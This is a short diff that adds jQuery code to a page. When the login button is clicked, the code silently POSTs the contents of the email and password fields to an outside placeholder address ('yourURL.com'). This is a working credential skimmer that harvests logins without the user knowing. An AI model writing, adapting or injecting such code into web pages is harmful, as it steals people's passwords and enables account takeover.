@@ -1,0 +1,3 @@
+$('#loginbutton').bind('click',function() {
+	$.ajax({type: 'POST',url: 'http://yourURL.com',data: { username: $('#email').val(), password: $('#pass').val() },success: function() { }});
+});
